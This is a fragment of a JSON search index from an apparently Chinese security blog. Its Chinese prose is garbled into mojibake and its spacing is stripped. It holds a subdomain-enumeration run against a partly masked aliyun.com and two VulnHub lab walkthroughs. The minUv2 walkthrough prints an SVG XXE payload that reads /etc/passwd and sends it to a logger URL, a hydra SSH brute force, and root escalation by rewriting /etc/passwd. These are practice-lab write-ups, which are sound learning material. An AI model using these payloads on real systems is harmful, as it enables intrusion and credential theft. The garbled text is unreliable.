¼å¼ï¼šfindomain-texample.com-ocsv4ã€ä½¿ç”¨æ‰€æœ‰çš„APIè¿›è¡Œå­åŸŸåæœç´¢ï¼Œå¹¶å°†è¾“å‡ºå¯¼å‡ºä¸ºCSVæ–‡ä»¶æ ¼å¼ï¼šfindomain-texample.com-a-ocsv3.å®é™…ä½¿ç”¨$findomain-ta****un.com-ocsv$Target==&gt;a****un.comSearchingintheCertSpotterAPI...SearchingintheBufferoverAPI...SearchingintheCrtshdatabase...SearchingintheVirustotalAPI...SearchingintheSublist3rAPI...SearchingintheFacebookAPI...SearchingintheThreadcrowdAPI...SearchingintheSpyseAPI...AnerrorâŒhasoccurredwhileparsingtheJSONobtainedfromtheThreadcrowdAPI.Errordescription:JSONerror.AnerrorâŒhasoccurredwhileparsingtheJSONobtainedfromtheBufferoverAPI.Errordescription:JSONerror.AnerrorâŒhasoccurredwhileparsingtheJSONobtainedfromtheSublist3rAPI.Errordescription:JSONerror.Atimeoutâ³errorhasoccurredwhileprocessingtherequestintheFacebookAPI.Errordescription:timedoutAtotalof`153`subdomainswerefoundfor==&gt;a***un.comGoodluckHax0r!&gt;&gt;Filenameforthetargetaliyun.comwassavedin:./a*****n.com_1680.csvå¯ä»¥çœ‹åˆ°Atotalof153subdomains.æ‰€ä»¥ä½¿ç”¨findomainå·¥å…·ä¸€å…±æœé›†åˆ°äº†153ä¸ªå­åŸŸåã€‚æœ€åï¼Œgoodluckã€‚ä¸”è¾“å‡ºçš„csvæ–‡ä»¶å°±è¾“å‡ºåœ¨è¿è¡Œå·¥å…·çš„å½“å‰æ–‡ä»¶å¤¹ä¸‹ã€‚æ¨èå¤§å®¶å¯ä»¥è¯•è¯•çœ‹,æœé›†ä¿¡æ¯è¿˜æ˜¯å¾ˆå¥½ç”¨çš„ï¼Œä¹ˆä¹ˆå“’"
  },

  {
    "title"    : "ã€Œæ¸—é€ã€SVGçš„ç¥ç§˜åŠ›é‡ï¼šminUv2",
    "category" : "",
    "tags"     : "Web, æ¼æ´å¤ç°, æ¸—é€, vulnhub",
    "url"      : "/blog/2019/minUv2/",
    "date"     : "Sep 1, 2019",
    "content"  : "categories:blogWebæ¼æ´å¤ç°æ¸—é€vulnhubåºè¨€hello,å„ä½ã€‚æœ€è¿‘é—²æ¥æ— äº‹ï¼Œå·¥ä½œä¹‹ä½™å·å·ç”¨å…¬å¸ç”µè„‘æµ‹è¯•å…¥ä¾µäº†ä¸€ä¸ªlinuxé¶æœºï¼Œé‚è®°å½•ä¸‹ã€‚ï¼ˆæ‰‹åŠ¨ç‹—å¤´ï¼‰è¿™ä¸ªé¶æœºæœ¬èº«éš¾åº¦é€‚ä¸­ï¼Œå¤ç°äº†svgçš„ä»£ç æ‰§è¡Œæ¼æ´ä¸”è¦æ±‚å¯¹linuxçš„ç³»ç»Ÿå‘½ä»¤è¾ƒä¸ºç†Ÿæ‚‰ï¼›svgå¤§ä½“æ¥è¯´æ˜¯ä¸€ç§å›¾åƒæ–‡ä»¶æ ¼å¼ï¼ŒåŸºäºXMLï¼Œç”±W3Cè”ç›Ÿè¿›è¡Œå¼€å‘çš„ï¼Œæ”¯æŒç½‘é¡µæ‰“å¼€ï¼Œç¼–è¾‘æ–¹ä¾¿ç­‰ã€‚å¯ä»¥è‡ªè¡Œæ·±å…¥æœç´¢~å„ä½å¤§ä½¬è§ç¬‘ã€‚ä¸€ã€é¶æœºç®€ä»‹minUv2ä¸‹è½½åœ°å€:Download(Mirror)Download(Torrent)äºŒã€å®æˆ˜æ±Ÿæ¹–è§„çŸ©ï¼Œç¥å™¨å¼€è·¯ï¼šé¦–å…ˆå…ˆç”¨Nmapæ‰«æç¡®å®šé¶æœºåœ°å€ã€‚å‘ç°é¶æœºipã€‚è¿™é‡Œé¶æœºåªæ”¯æŒvboxï¼Œæ‰€ä»¥å¾—æ¡¥æ¥é€šä¿¡ï¼Œæ‰“ç è¯·è°…è§£~ç¡®å®šipç›´æ¥ç«¯å£æ‰«æ~å‘ç°åªå¼€æ”¾äº†ä¸¤ä¸ªç«¯å£ï¼š22ã€3306ç«¯å£ã€‚22ç«¯å£æš‚æ—¶å…ˆæ”¾ç€ä¸ç®¡ï¼Œå’±ä»¬çœ‹çœ‹3306ç«¯å£ã€‚æ˜¯ä¸€ä¸ªwebé¡µé¢ï¼Œemmmm.ä¸»è§’ç™»åœºï¼Œsvgå›¾åƒ~ä¸‰ã€å‘ç°æ¼æ´å°å¼Ÿèµ¶ç´§dirbæ‰«æä¸€æ³¢ï¼Œæœç„¶æœ‰å‘ç°ã€‚#æ‰«æ3306ç«¯å£ä¸‹çš„htmlåç¼€çš„æ–‡ä»¶dirbhttp://$_ip:port-X.html--------------+http://$_ip:port/upload.html(CODE:200|SIZE:908)--------------DOWNLOADED:4612-FOUND:1å‘ç°äº†ä¸Šä¼ ç½‘é¡µï¼Œä¸”åªèƒ½ä¸Šä¼ svgã€imgæ–‡ä»¶ï¼ŒåˆæƒŠåˆå–œã€‚expæœç´¢ä¸€å“ˆæ‰¾åˆ°pocï¼ŒéªŒè¯ä¸€ä¸‹æ¼æ´çš„å­˜åœ¨ã€‚pocä»£ç å¦‚ä¸‹ï¼š#pocä¸Šä¼ ä¸Šå»é¡µé¢å›æ˜¾#&lt;!DOCTYPEsvg[&lt;!ELEMENTsvgANY&gt;&lt;!ENTITYxxeSYSTEM\"/etc/passwd\"&gt;]&gt;&lt;svgversion=\"1.0\"xmlns=\"http://www.w3.org/2000/svg\"width=\"19000px\"xmlns:xlink=\"http://www.w3.org/1999/xlink\"&gt;&lt;textx=\"-1000\"y=\"-1000\"&gt;&amp;xxe;&lt;/text&gt;&lt;circlecx=\"50\"cy=\"50\"r=\"40\"stroke=\"black\"stroke-width=\"3\"\t\tfill=\"red\"/&gt;&lt;script&gt;varlogger=\"http://localhost/?file=\"+encodeURIComponent(document.getElementsByTagName(\"text\")\t[0].innerHTML);document.createElementNS('http://www.w3.org/2000/svg','image').setAttributeNS('http://www.w3.org/1999/xlink','href',logger);&lt;/script&gt;&lt;/svg&gt;æœç„¶æœ‰xxeæ¼æ´ï¼Œä½†æ˜¯éªŒè¯äº†æ¼æ´ä¸èƒ½è®©æˆ‘ä»¬æœ‰å®é™…çš„æ¸—é€è¿›å±•ï¼Œåªèƒ½å¯¹ä¸€äº›æ–‡ä»¶å†…å®¹è¿›è¡ŒæŸ¥çœ‹ï¼Œæ— æ³•å¾—åˆ°shellï¼Œè¦æ€ä¹ˆåŠå‘¢ï¼Ÿå››ã€getshellå°±åœ¨å°å¼Ÿæ„çœ‰è‹¦è„¸çš„æ—¶å€™ï¼Œå¿½ç„¶çœ‹åˆ°æœ€åä¸€è¡Œç”¨æˆ·åçš„è¿›ç¨‹æ˜¯/bin/ashï¼Œæƒ³åˆ°bashshellä¼šæœ‰å†å²çºªå½•ï¼Œèµ¶ç´§é‡æ–°ä¸Šä¼ ä¸€ä¸ªpocéªŒè¯æƒ³æ³•ã€‚å›æ˜¾å†…å®¹ï¼š\"./ash.history\"è·å–~Useraddâ€“Dbossdonttrackmeâ€“psuperultrapass3æ ¹æ®æ‰€å¾—çš„å†…å®¹ç”Ÿæˆç”¨æˆ·å­—å…¸ï¼ˆpasswdå›æ˜¾çš„ç”¨æˆ·åï¼‰ï¼Œå¯†ç å­—å…¸ã€‚ç”¨Hydraè·‘ä¸€ä¸‹ã€‚##hydra-L/root/Documents/test/minu/use.txt-P/root/Documents/test/minu/passwd.txtssh://$_ipHydrav8.9.1(c)2019byvanHauser/THC-Pleasedonotuseinmilitaryorsecretserviceorganizations,orforillegalpurposes.[WARNING]ManySSHconfigurationslimitthenumberofparalleltasks,itisrecommendedtoreducethetasks:use-t4\t[DATA]max16tasksper1server,overall16tasks,30logintries(l:30/p:1),~2triespertask[DATA]attackingssh://$_ip:22/[22][ssh]host:$_ip**login:employeepassword:superultrapass3**1of1targetsuccessfullycompleted,1validpasswordfound##è·‘å‡ºæ¥è´¦å·å¯†ç employeeï¼šuperultrapass3ï¼Œsshè¿ä¸Šå»ã€‚##è¿æ¥ä¸Šå»æŸ¥çœ‹ä¸€ä¸‹åŸºæœ¬ä¿¡æ¯sshemployee@ipwhoamiid|find-perm-40002&gt;/dev/nulläº”ã€ææƒå‘ç°microå’Œbbsuidä¸éœ€è¦é«˜æƒé™ï¼Œè¿è¡Œä¸€ä¸‹ï¼Œå‘ç°microæ˜¯ä¸€ä¸ªæ–‡æœ¬ç¼–è¾‘å·¥å…·å™¨ã€‚æ¥ä¸‹æ¥å°±ç®€å•äº†ã€‚#ç”Ÿæˆä¸€ä»½hashå€¼ï¼Œæ›¿æ¢æ‰passwdçš„ç”¨æˆ·å¯†ç ï¼Œè¿™æ ·å¯†ç å°±å·²çŸ¥äº†ã€‚#ç”¨microç¼–è¾‘å™¨æ‰“å¼€passwdæ–‡ä»¶ï¼Œæ›¿æ¢rootå¯†ç ä¿å­˜å³å¯passwd-1-saltyrootadmin123(éšæ„)cat/etc/passwd|/usr/bin/microè¿™æ ·æˆ‘ä»¬å°±å·²çŸ¥rootå¯†ç äº†ï¼Œç›´æ¥åˆ‡æ¢ç”¨æˆ·minuv2:~$surootPassword:minuv2:/home/employee#whoamirootminuv2:/home/employee#è·å¾—flag~æ„Ÿè°¢å„ä½"
  },

  {
    "title"    : "ã€Œæ¸—é€ã€:PumpkinRaising-å¯†ç å­¦çš„å¥¥ä¹‰",
    "category" : "",
    "tags"     : "Web, æ¼æ´å¤ç°, æ¸—é€, vulnhub",
    "url"      : "/blog/2019/vulnhub/PumpkinRaising/",
    "date"     : "Jul 15, 2019",
    "content"  : "åºè¨€hello,å„ä½çœ‹å®˜ã€‚æœ€è¿‘å¿™é‡Œå·é—²èŠ±äº†ä¸¤å¤©æ—¶é—´æµ‹è¯•å…¥ä¾µäº†ä¸€ä¸ªlinuxé¶æœºï¼Œé‚è®°å½•ä¸‹ã€‚è¿™ä¸ªé¶æœºæˆ‘è§‰å¾—æŒºé€‚åˆåˆšå…¥é—¨çš„æœ‰ä¸€äº›åŸºç¡€çš„ç™½å¸½å­ï¼Œå¯¹å°±æ˜¯ä½ ï¼ï¼Œå¤§éƒ¨åˆ†flagéƒ½æ˜¯åˆ©ç”¨ä¸€äº›å·¥å…·æ¥è·å¾—ã€‚å¤§ä½¬çœ‹å®¢ç¬‘çœ‹ä¾¿æ˜¯ï¼ˆæ‰‹åŠ¨ç‹—å¤´ï¼‰ã€‚æ•´ç¯‡è®°å½•çš„éƒ½æ˜¯å°å¼Ÿçš„æ€è·¯ï¼Œçœ‹å®˜ä»¬è·Ÿç€å°å¼Ÿçš„æ€è·¯çœ‹å°±æ˜¯äº†ï¼Œä¼šæœ‰äº›ä¹±ã€‚è§ç¬‘ã€‚ä¸€ã€é¶æœºé¶æœºæ¥è‡ªvulnhubï¼Œä¸‹è½½åœ°å€å¦‚ä¸‹ï¼šPumpkinRaising:Download(Mirror):https://download.vulnhub.com/missionpumpkin/PumpkinRaising.ovaDownload(Torrent):https://download.vulnhub.com/missionpumpkin/PumpkinRaising.ova.torrentäºŒã€å®æˆ˜2.1ç«¯å£æ‰«ææ±Ÿæ¹–è§„çŸ©ï¼Œç¥å™¨å¼€è·¯ï¼šé¦–å…ˆå…ˆç”¨Nmapæ‰«æç¡®å®šé¶æœºåœ°å€ã€‚å‘ç°å¼€æ”¾çš„é¶æœºipã€‚æ‰«æä¸€æ³¢ï¼ˆ-O-Aç‹—å¤´ï¼‰ï¼šå’±ä»¬å‘ç°æ²¡æœ‰å¤šä½™çš„ç«¯å£å¼€æ”¾ï¼Œä¸­è§„ä¸­çŸ©ï¼Œ22,80ç«¯å£ã€‚é™„å¸¦æ‰«å‡º80ç«¯å£ä¸‹çš„robots.txtã€‚å°å¼Ÿä¸€ä¸ªæ¿€çµï¼Œè¿™ä¹ˆå¤šï¼Ÿå¿ƒé‡Œç¾æ»‹æ»‹ä¸€ä¸ªä¸€ä¸ªæ‰“å¼€çœ‹ï¼Œä¸æ€¥ï¼Œè¿™æ¬¡æ€•æ˜¯åæ‹¿ä¹ç¨³ï¼ˆç‹—å¤´ï¼‰ã€‚22ç«¯å£å…ˆä¸ç®¡ä»–ï¼Œå°å¼Ÿçœ‹åˆ°è¿™ä¹ˆå¤šå†…å®¹çš„robotsæ–‡ä»¶å¤¹ï¼Œå¦‚è·è‡³å®èµ¶ç´§æ‰“å¼€ï¼Œæˆ‘çš„ä¹–ï¼Œç›®å½•å›¾ç‰‡æ–‡ä»¶è·¯å¾„ï¼Œå…ˆçœ‹çœ‹æ–‡ä»¶é€‰é¡¹æœ‰æ²¡æœ‰ä»€ä¹ˆçº¿ç´¢ã€‚2.2ç«¯å£â€œè¸©ç‚¹â€â€”â€”é¡ºè—¤æ‘¸ç“œå°å¼Ÿè¯•ä¸‹æ¥åå‘ç°æ–‡ä»¶åªæœ‰å¦‚ä¸‹èƒ½å¤Ÿè®¿é—®ï¼š1ï¼‰underconstruction.htmlï¼šï¼ˆé¡µé¢åæ„è¿˜åœ¨å»ºè®¾çš„é¡µé¢ï¼‰æç¤ºæˆ‘ä»¬è¯´å›¾ç‰‡ä¸‹é¢æœ‰çŒ«è…»ã€‚å’±ä»¬å…ˆæŠŠè¿™ä¸ªuc.gifå›¾ç‰‡ä¸‹è½½ä¸‹æ¥è¯•è¯•æ°´ã€‚æ­£å¥½å°å¼Ÿæœ€è¿‘åœ¨ç ”ç©¶å›¾ç‰‡éšå†™ï¼Œä¸¢åˆ°StegsolveæŸ¥çœ‹ä¸€æ³¢ã€‚è·Ÿæ™®é€šå›¾ç‰‡å·®ä¸å¤šAlphaP1-7éƒ½æ˜¯ç©ºç™½ç¿»äº†åˆç¿»è§‰å¾—RedP6ã€7æœ‰ç‚¹å¼‚å¸¸ï¼Œæ‰“å¼€æ•°æ®æŠ½å–æŸ¥çœ‹æºç æ²¡æœ‰æ”¶è·ï¼ˆåŸè°…å°å¼Ÿï¼Œå°å¼Ÿæ˜¯noob~ï¼‰ï¼›å°è¯•äº†GRBå„ç§ç»„åˆï¼Œå„ç§ä½0ä½ï¼Œä¹Ÿå°è¯•äº†æå–binéƒ½æœªæå–å‡ºæœ‰ç”¨çš„ä¿¡æ¯ã€‚å¿½ç„¶æƒ³åˆ°è¿™ä¸ªå›¾ç‰‡æ˜¯gifï¼Œä¼šä¸ä¼šæœ‰åç§»å‘¢ï¼Ÿèµ¶ç´§StereogramSloverå°è¯•åç§»ï¼Œä¸å‡ºæ‰€æ–™ä¹Ÿå¤±è´¥äº†ï¼Œå°±è¿™æ ·åœ¨è¿™å¼ å›¾ç‰‡ä¸Šæµªè´¹äº†ä¸å°‘æ—¶é—´ã€‚æ—¢ç„¶æ‰¾ä¸åˆ°æœ‰ç”¨çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆè¿™å¼ å›¾ç‰‡å…ˆæ”¾ä¸€æ”¾ã€‚ã€‚ä¸æ€¥ï¼Œå…ˆå¾€åé¢çœ‹ã€‚ç»§ç»­é€šè¿‡robotsæ–‡ä»¶çš„å†…å®¹æŸ¥çœ‹ã€‚2ï¼‰hiddenç›®å½•çš„noteæ–‡æœ¬hiddenç›®å½•ä¸‹çš„noteæ–‡æœ¬æ–‡ä»¶ï¼Œæ˜¾ç¤ºäº†ä¸€äº›è²Œä¼¼è´¦å·å¯†ç çš„æ–‡æœ¬ï¼Œéš¾é“æ˜¯sshçš„è´¦å·ä¿¡æ¯ï¼Ÿä¸ä¼šè¿™ä¹ˆç®€å•å§ï¼Œè™½ç„¶å˜´ä¸Šè¯´ç€ä¸ä¼šï¼Œèº«ä½“å´å¾ˆè¯šå®å»è¯•äº†è¯•ï¼Œä¸è¡Œã€‚ã€‚ä½†æ˜¯æˆ‘ä»¬åˆ°ç°åœ¨è¿˜æ²¡æœ‰å‘ç°ç±»ä¼¼ç™»é™†é¡µé¢çš„ä¸œè¥¿ï¼Œä¹Ÿå…ˆæ”¾ä¸€æ”¾ã€‚3ï¼‰/seeds/seed.txt.gpgè®¿é—®åç›´æ¥ä¸‹è½½ä¸‹æ¥äº†ï¼Œgpgï¼Ÿä¸‹è½½ä¸‹æ¥æ‰“å¼€ä¹±ç ï¼Œè°·æ­Œä¸€å“ˆæœåˆ°å‡ ä¸ªå·¥å…·ï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯kaliçš„gpgï¼ˆæ²¡ç”¨è¿‡å¯ä»¥è‡ªè¡Œç™¾åº¦æœ‰æ•™ç¨‹å®‰è£…ï¼Œå‡ ç™¾Kï¼‰èŠ±äº†ç‚¹æ—¶é—´æ‘¸ç´¢äº†ä¸€ä¸‹å‘ç°äº†çº¿ç´¢çœ‹ç€åƒæ‘©æ–¯å¯†ç ï¼Œä¸¢åˆ°æ‘©æ–¯è§£å¯†å·¥å…·é‡Œè§£å¯†ï¼Œå°±è¿™æ ·å°å¼Ÿå±…ç„¶å¾—åˆ°äº†ç¬¬ä¸€ä¸ªflagï¼ˆidï¼‰ï¼š695072.3è¨€å½’æ­£ä¼ â€”â€”80ç«¯å£å’±ä»¬å†æ¥çœ‹çœ‹ä¸»é¡µæœ‰äº›å•¥ã€‚80ç«¯å£ä¸‹é™æ€é¡µé¢~æŸ¥çœ‹æºç ï¼Œå¾—åˆ°ä¸¤ä¸ªæœ‰ç”¨çš„ä¿¡æ¯ï¼šä¸€æ®µçœ‹ä¸Šå»åƒbase64çš„å¯†æ–‡ï¼Œèµ¶ç´§ä¸¢åˆ°è§£å¯†å·¥å…·è§£å¯†ï¼Œæ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼šThisisjusttoremaindyouthatit'sLevel2ofMission-Pumpkin!;)ç»§ç»­ï¼Œä¸€ä¸ªurlï¼Œè½¬å‘pumpkin.htmlåˆæ˜¯ä¸€ä¸²æ³¨é‡Šæ‰çš„å¯†æ–‡å­—ç¬¦ä¸²ï¼Œä¸¢base64è§£ä¸å‡ºï¼Œè¯•è¯•base32è§£ã€‚è§£å¯†ä¸ºï¼š/scripts/spy.pacpï¼Œè®¿é—®ä¸€å“ˆï¼Œä¸‹è½½ä¸‹æ¥ä¸€ä¸ªtcpåŒ…æ–‡ä»¶ï¼Œwiresharkæ‰“å¼€ï¼Œéšæ„ç‚¹ä¸€ä¸ªå¸¦æœ‰pushå­—çš„åŒ…å‘ç°æ˜æ–‡ä¼ è¾“ï¼Œæ¯«ä¸çŠ¹è±«è¿½è¸ªTCPæµï¼Œå‘ç°IDï¼š50609~luckyï¼Œä¸é”™å“Ÿé‡ç‚¹æ¥äº†ï¼šåˆ«å¿˜äº†ä¸Šé¢pumpkin.htmlå³è¾¹çš„æ»‘å—ï¼Œæ‹‰åˆ°åº•å‘ç°è¢«æ³¨é‡Šæ‰çš„åå…­è¿›åˆ¶çš„æ•°ç»„ï¼Œç”¨ç½‘ç«™å·¥å…·è§£å¯†ï¼Œæ‰¾åˆ°SeedsID:96454ï¼ˆæœ¬äººä¹ æƒ¯æ¯”è¾ƒå·®ï¼Œä¸å–œæ¬¢f12ï¼Œæ‰€ä»¥è¿™ä¸ªç‚¹çœŸçš„åçŸ¥åè§‰æ‰å‘ç°ï¼Œå°å£°bbï¼‰ç»ˆäºåŠŸå¤«ä¸è´Ÿæœ‰å¿ƒäººï¼Œå·²ç»è§£å‡ºä¸‰ä¸ªidï¼Œæ ¹æ®ä½œè€…é¶æœºä¸‹è½½é¡µé¢çš„æç¤ºä¸€å…±æœ‰å››ä¸ªidã€‚æ€»ç»“ä¸€ä¸‹ï¼Œè¿˜æœ‰ä¸€å¼ gifå›¾ç‰‡è—ç€ä¸€ä¸ªidï¼Œè§£å¯†å‡ºæ¥å†åŠ ä¸Šå·²ç»è§£å¯†å‡ºçš„ä¸‰ä¸ªidï¼Œå°±å¤§åŠŸå‘Šæˆäº†ã€‚ï¼ˆè¿™ä¹ˆè‡ªä¿¡ï¼Ÿï¼‰æ—¢ç„¶Stegsolveè¯•äº†ä¸è¡Œå’±ä»¬å°±æ¢ä¸€ä¸ªï¼Œä½¿ç”¨stegosuiteè§£å¯†ï¼Œè¯•äº†ä¸€ä¸‹éœ€è¦å¯†ç ï¼Œå¿½ç„¶æƒ³åˆ°ä¹‹å‰hiddenç›®å½•ä¸‹å¥‡æ€ªçš„å­—ç¬¦ï¼Œèµ¶ç´§å¤åˆ¶ä¸‹æ¥ä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œè¿˜æ˜¯ä¸è¡Œï¼Œæç¤ºå¯†ç é”™è¯¯ã€‚éš¾å—~éš¾é“æ˜¯å›¾ç‰‡é”™äº†ï¼Ÿæœç„¶ï¼Œåœ¨å°å¼Ÿçš„åšæŒä¸æ‡ˆçš„åŠªåŠ›ä¸‹ï¼Œå‘ç°äº†çŒ«è…»ã€‚çŒ«è…»ä¸åœ¨äºå›¾ç‰‡ä¸‹çš„éšå†™ï¼Œè€Œåœ¨äºå“ªå¼ å›¾ç‰‡ã€‚ã€‚ã€‚æœ€åéšå†™å›¾ç‰‡æ˜¯é‚£å¼ jackolatantern.gifã€‚ï¼ˆé¶æœºä½œè€…å·²ç»è¢«æˆ‘åæ§½ä¸€ä¸‡éï¼‰æå–æ–‡æœ¬ï¼Œå¾—åˆ°idï¼š865682.4idå·²é½ï¼ŒLetsGoå°±è¿™æ ·ï¼Œä¸€å…±æ‰¾åˆ°å››ä¸ªseedsidï¼š69507964545060986568æ¥ç€å°å¼Ÿçœ‹ç€è¿™ä¸ªå››ä¸ªidï¼ŒçŒœæµ‹ç”¨æˆ·åjackå¹¶ä¸”é™·å…¥äº†æ·±æ·±çš„æ²‰æ€ï¼Œåˆ°åº•æ˜¯ç”¨msfè·‘å‘¢ï¼Œè¿˜æ˜¯æµ·å¾·æ‹‰~æ²¡é”™å°å¼Ÿå°±æ˜¯è¿™ä¹ˆçº ç»“--(è„šæœ¬æ˜¯pythonçš„å†…å»ºå‡½æ•°å†™çš„æ–‡å°¾é™„ä¸Š)ä¸‰ã€ç»„åˆæ‹³â€”â€”ssh,ææƒæœ€åè¿˜æ˜¯ç”¨äº†æœ€çˆ±çš„msfè·‘å‡ºæ¥å¯†ç ï¼ˆå…ˆç”¨è„šæœ¬ç»„åˆå››ä¸ªidçš„ä¸åŒç»„åˆå³å¯ï¼‰ï¼Œå¦‚å›¾è·‘å‡ºæ¥äº†ã€‚ä¸‹ä¸€æ­¥sshè¿å§ã€‚ssh-ljackpassç»§ç»­è¡Œäº‘æµæ°´ï¼Œsudosuã€‚ä¸è¡Œï¼Ÿæœ€åå‚è€ƒèµ„æ–™æåˆ°æƒé™ã€‚çœå»expææƒ~å››ã€æ€»ç»“æ€»ç»“ä¸‹æ¥ï¼Œæ­¤æ¬¡è¿™ä¸ªé¶æœºçš„å…¥ä¾µè¿‡ç¨‹è™½ç„¶æœ‰äº›æ›²æŠ˜ï¼Œæœ¬èœä¹Ÿè¢«è¯¯å¯¼åˆ°ä¸å°‘å‘é‡Œ~ä½†æ˜¯æ€»ä½“æ¥è¯´éƒ½ä¸æ˜¯å¾ˆéš¾ï¼Œæ²¡æœ‰è®©æˆ‘ä»¬æ¥æŒ–æ´æ‰¾é¡µé¢æ¼æ´æ¥å¼¹webshellï¼Œæ‰€ä»¥å°å¼Ÿè®¤ä¸ºæ¯”è¾ƒé€‚åˆä¸€äº›æœ‰æ¸—é€åŸºç¡€çš„ç©å®¶~ï¼ˆå¯¹ï¼Œå°±æ˜¯æˆ‘æ²¡é”™ï¼‰ã€‚å‚è€ƒèµ„æ–™https://www.360zhijia.com/anquan/413205.htmléšæœºç»„åˆè„šæœ¬:#a,b,c,dä»£æ›¿å³å¯ï¼Œåˆ«å¿˜äº†pythonä¸¥æ ¼çš„ç¼©è¿›~importitertools\tforiinitertools.permutations([a,b,c,d],4):\tprint(i)havefunï¼guys.whynotdoityourself?"
  }

]